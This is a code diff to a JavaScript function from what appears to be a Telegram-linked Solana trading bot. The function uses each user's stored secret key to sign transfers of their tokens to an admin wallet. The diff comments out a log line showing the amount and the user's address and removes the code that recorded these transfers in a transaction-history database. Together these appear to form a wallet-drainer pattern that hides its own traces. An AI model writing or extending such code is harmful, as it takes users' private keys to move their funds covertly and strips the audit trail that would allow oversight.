@@ -16,7 +16,6 @@ const USDC_MINT=process.env.USDC_MINT;
 
 const tokenTransferToAdmin = async (inputMint, amount, user) => {
     try {
-
         const secretKey = user.secretKey;
         const userWallet = Keypair.fromSecretKey(bs58.decode(secretKey));
         const instructions = [];
@@ -50,7 +49,7 @@ const tokenTransferToAdmin = async (inputMint, amount, user) => {
             
             console.log('Forwarding asset to admin wallet...');
         } else{
-            console.log(`${amount} token to ${userWallet.publicKey.toBase58()}`);
+            //console.log(`${amount} token to ${userWallet.publicKey.toBase58()}`);
             sendSignalToFrontend(user.telegramID, 'data: ' + `token_${amount}` + '\n\n');
             [ associatedTokenAccountForAdmin, associatedTokenAccountForUser ] = await Promise.all([
                 getAssociatedTokenAddressSync(new PublicKey(inputMint), adminWallet.publicKey),
@@ -78,20 +77,6 @@ const tokenTransferToAdmin = async (inputMint, amount, user) => {
         console.log('Forwarding tokens to admin wallet...');
 
         const transferSignature = await connection.sendRawTransaction(versionedTransaction.serialize(), [adminWallet, userWallet]);
-
-        // const transactionDatabase = await TransactionHistory.insertOne({
-        //     telegramID: user.telegramID,
-        //     signature: transferSignature,
-        //     mintAddress: inputMint,
-        //     inAmount: amount,
-        //     tx_type: 1,
-        //     tx_state: 1,
-        //     create_at: Date.now(),
-        //     updated_at: Date.now()
-        // });
-        // console.log('Saving Database');
-
-        // await transactionDatabase.save();
         
         let outAmount = null;
         try{
